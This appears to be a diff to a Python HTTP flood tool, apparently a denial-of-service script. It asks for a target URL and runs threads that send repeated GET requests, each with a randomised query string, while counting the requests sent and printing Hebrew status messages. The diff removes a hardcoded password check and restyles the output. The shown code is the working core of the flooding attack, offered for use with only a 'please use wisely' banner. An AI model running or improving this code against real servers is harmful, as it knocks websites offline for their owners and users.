@@ -47,12 +47,6 @@ print("\033[33m                         design By: ZA'99                        
 print("\033[1m                   —°0  please use wisely  0°—                         \033[0m")    
 print("\033[33m⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵\033[0m")      
 print("\033[32m======================================================================\033[0m")
-def authenticate():
-    password = "fucklove"  # The password to access the tool
-    user_password = getpass.getpass(prompt="\033[1;36mEnter the password to access the tool: \033[0m")
-    if user_password != password:
-        print("\033[1;31mIncorrect password. Exiting...\033[0m")
-        exit()
 url = input("URL:  ").strip()
 
 u = int(0)
@@ -99,10 +93,11 @@ class httpth1(threading.Thread):
                 randomized_url = url + "?" + genstr(random.randint(3, 10))
                 requests.get(randomized_url, headers=headers)
                 u += 1
-                print("[☀️] \033[34mNOZZ:  \033[32m " +str(u)+ "   \033[33mשלח את החבילה אל\033[36m   " +url+ "\033[0m" )
-                print("[☀️] \033[96mNOZZ:  \033[94m " +str(u)+ "   \033[91mשלח את החבילה אל\033[92m   " +url+ "\033[0m" )
+                print("[☀️] \033[96mN0ZZ: \033[94m " +str(u)+ "  \033[91mשלח את החבילה אל\033[92m   " +url+ "\033[0m" )
+                print("[☀️] \033[33mN0ZZ: \033[32m " +str(u)+ "  \033[31mשלח את החבילה אל\033[34m   " +url+ "\033[0m" )
+            
             except requests.exceptions.ConnectionError:
-                print ("[Server might be down!]")
+                print ("\033[32m[יכול להיות שהשרת מושבת!]\033[0m")
                 pass
             except requests.exceptions.InvalidSchema:
                 print ("[URL Error]")
